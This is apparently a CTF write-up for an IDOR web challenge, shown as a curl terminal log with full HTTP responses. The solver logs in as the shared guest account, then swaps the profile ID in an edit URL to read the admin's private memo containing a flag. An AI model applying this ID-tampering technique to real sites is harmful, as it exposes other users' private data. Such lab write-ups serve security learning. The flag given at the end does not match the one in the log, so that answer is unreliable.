# Writeup
```bash
╰─ (*'-') < curl -i -c cookies.txt \
  'http://web.katagaitai-ctf.net/idor/step1/login?user=Admin'
HTTP/1.1 200 OK
Server: nginx/1.27.3
Date: Sat, 07 Nov 2026 10:50:38 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 885
Connection: keep-alive
Vary: Cookie

<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ログイン - Profile Share</title>
<link rel="stylesheet" href="/idor/step1/static/style.css">
</head>
<body>
<header>
  <div class="header-inner">
    <a class="site-name" href="/idor/step1/">Profile Share</a>
    
  </div>
</header>
<main>

<h1>ログイン</h1>

<form method="post" action="/idor/step1/login">
  <label class="label" for="user_name">ユーザ名</label>
  <input type="text" id="user_name" name="user_name" autocomplete="username">
  <label class="label" for="password">パスワード</label>
  <input type="password" id="password" name="password" autocomplete="current-password">
  <p><button type="submit">ログイン</button></p>
</form>
<p class="hint">共用アカウント: Guest / guest</p>

</main>
</body>
</html>%                                                                                                                ╭─ /Users/mionorn124/Desktop/CTF-Writteup/katagaitaiCTF2026/web/waf_source(pwn)
╰─ (*'-') < curl -i -L \
  -c cookies.txt \
  -b cookies.txt \
  -d 'user_name=Guest&password=guest' \
  'http://web.katagaitai-ctf.net/idor/step1/login'
HTTP/1.1 302 FOUND
Server: nginx/1.27.3
Date: Sat, 07 Nov 2026 10:50:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 229
Connection: keep-alive
Location: /idor/step1/profile/2
Vary: Cookie
Set-Cookie: profile_session=eyJ1c2VyX2lkIjoyfQ.au8CiA.UxNNsKsiDliuDTnNh7nV39lUlI0; HttpOnly; Path=/idor/step1; SameSite=Lax

HTTP/1.1 200 OK
Server: nginx/1.27.3
Date: Sat, 07 Nov 2026 10:50:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1221
Connection: keep-alive
Vary: Cookie

<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ゲスト - Profile Share</title>
<link rel="stylesheet" href="/idor/step1/static/style.css">
</head>
<body>
<header>
  <div class="header-inner">
    <a class="site-name" href="/idor/step1/">Profile Share</a>
    
    <span class="user-info">Guest としてログイン中<a href="/idor/step1/logout">ログアウト</a></span>
    
  </div>
</header>
<main>

<div class="card">
  <p class="nickname">ゲスト</p>
  <p class="handle">@Guest</p>
  <span class="label">ひとこと</span>
  <div>共用のお試しアカウントです。</div>
  <span class="label">Xアカウント</span>
  <div>@Twitter</div>
</div>

<div class="card">
  <span class="label">プロフィールを共有</span>
  <div class="row">
    <input type="text" id="share-url" value="http://web.katagaitai-ctf.net/idor/step1/profile/2" readonly>
    <button type="button" onclick="var i=document.getElementById('share-url');i.select();document.execCommand('copy');">コピー</button>
  </div>
  <p><a href="/idor/step1/profile/2/edit">プロフィールを編集</a></p>
</div>


</main>
</body>
</html>%                                                                                                                ╭─ /Users/mionorn124/Desktop/CTF-Writteup/katagaitaiCTF2026/web/waf_source(pwn)
╰─ (*'-') < curl -i -b cookies.txt \
  'http://web.katagaitai-ctf.net/idor/step1/profile/2/edit'
HTTP/1.1 200 OK
Server: nginx/1.27.3
Date: Sat, 07 Nov 2026 10:51:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1417
Connection: keep-alive
Vary: Cookie

<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>プロフィール編集 - Profile Share</title>
<link rel="stylesheet" href="/idor/step1/static/style.css">
</head>
<body>
<header>
  <div class="header-inner">
    <a class="site-name" href="/idor/step1/">Profile Share</a>
    
    <span class="user-info">Guest としてログイン中<a href="/idor/step1/logout">ログアウト</a></span>
    
  </div>
</header>
<main>

<h1>プロフィール編集</h1>
<div class="notice">※ この問題では、共用アカウントのため編集内容の保存機能はありません（問題の解答には不要です）。</div>
<div class="card">
  <label class="label" for="nickname">ニックネーム</label>
  <input type="text" id="nickname" value="ゲスト">
  <label class="label" for="bio">ひとこと</label>
  <input type="text" id="bio" value="共用のお試しアカウントです。">
  <label class="label" for="x_account">Xアカウント</label>
  <input type="text" id="x_account" value="@Twitter">
  <label class="label" for="private_memo">非公開メモ（本人のみ閲覧できます）</label>
  <input type="text" id="private_memo" value="ここは本人にしか見えないメモ欄です。">
</div>
<p><a href="/idor/step1/profile/2">プロフィールに戻る</a></p>

</main>
</body>
</html>%                                                                                                                ╭─ /Users/mionorn124/Desktop/CTF-Writteup/katagaitaiCTF2026/web/waf_source(pwn)
╰─ (*'-') < curl -i -b cookies.txt \
  'http://web.katagaitai-ctf.net/idor/step1/profile/1/edit'
HTTP/1.1 200 OK
Server: nginx/1.27.3
Date: Sat, 07 Nov 2026 10:51:07 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1405
Connection: keep-alive
Vary: Cookie

<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>プロフィール編集 - Profile Share</title>
<link rel="stylesheet" href="/idor/step1/static/style.css">
</head>
<body>
<header>
  <div class="header-inner">
    <a class="site-name" href="/idor/step1/">Profile Share</a>
    
    <span class="user-info">Guest としてログイン中<a href="/idor/step1/logout">ログアウト</a></span>
    
  </div>
</header>
<main>

<h1>プロフィール編集</h1>
<div class="notice">※ この問題では、共用アカウントのため編集内容の保存機能はありません（問題の解答には不要です）。</div>
<div class="card">
  <label class="label" for="nickname">ニックネーム</label>
  <input type="text" id="nickname" value="ジョン">
  <label class="label" for="bio">ひとこと</label>
  <input type="text" id="bio" value="このサイトの管理人です。">
  <label class="label" for="x_account">Xアカウント</label>
  <input type="text" id="x_account" value="@NRIST">
  <label class="label" for="private_memo">非公開メモ（本人のみ閲覧できます）</label>
  <input type="text" id="private_memo" value="katagaitai-CTF{IDOR_vuln_is_super_easy_to_exploit}">
</div>
<p><a href="/idor/step1/profile/1">プロフィールに戻る</a></p>

</main>
</body>
</html>%                                                                                                                ╭─ /Users/mionorn124/Desktop/CTF-Writteup/katagaitaiCTF2026/web/waf_source(pwn)
╰─ (*'-') < 


```
普通にあった

# flag
```
katagaitai-CTF{HT_of_HTML_and_HTTP_means_HyperText}
```